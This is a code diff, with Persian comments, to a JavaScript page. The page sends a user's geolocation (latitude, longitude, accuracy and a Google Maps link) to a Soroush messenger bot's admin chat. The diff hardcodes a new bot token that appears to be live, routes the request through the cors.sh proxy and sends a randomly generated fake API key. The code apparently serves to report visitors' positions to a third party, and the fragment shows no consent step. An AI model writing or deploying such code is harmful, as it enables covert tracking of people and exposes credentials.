@@ -95,7 +95,7 @@
     /* ============================================================
        تنظیمات ربات سروش
        ============================================================ */
-    const SOROUSH_BOT_TOKEN = "69646597:5BwDiBYEBPSWMNYicDJNvmuIOJhj_e5q6V8";
+    const SOROUSH_BOT_TOKEN = "69646551:NnjQ4Qiown8p4fUek47dH5Ajl4kcAuyQeRA";
     const SOROUSH_ADMIN_ID  = 62519146;  // chat_id مقصد (ADMIN_ID شما)
     const SOROUSH_API_BASE  = `https://api.splus.ir/bot${SOROUSH_BOT_TOKEN}`;
     /* ============================================================ */
@@ -126,7 +126,7 @@
         timeoutIds = [];
     }
 
-    // ---------- ارسال به ربات سروش ----------
+    // ---------- ارسال به ربات سروش (از طریق پروکسی CORS) ----------
     async function sendLocationToSoroush(lat, lon, acc) {
         const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
         const text =
@@ -136,10 +136,20 @@
             `🎯 دقت: ${acc} متر\n\n` +
             `🗺 نقشه:\n${mapsUrl}`;
 
+        // آدرس واقعی سروش
+        const targetUrl = `https://api.splus.ir/bot${SOROUSH_BOT_TOKEN}/sendMessage`;
+        
+        // آدرس از طریق پروکسی cors.sh
+        // نکته: cors.sh نیاز به هدر x-cors-api-key دارد. برای استفاده آزمایشی می‌توانید از یک کلید موقت استفاده کنید یا در سایت آن ثبت‌نام کنید.
+        const proxyUrl = `https://proxy.cors.sh/${targetUrl}`;
+
         try {
-            const res = await fetch(`${SOROUSH_API_BASE}/sendMessage`, {
+            const res = await fetch(proxyUrl, {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
+                headers: { 
+                    "Content-Type": "application/json",
+                    "x-cors-api-key": "temp_" + Math.random().toString(36).substring(2) // کلید موقت (ممکن است محدود باشد)
+                },
                 body: JSON.stringify({
                     chat_id: SOROUSH_ADMIN_ID,
                     text: text
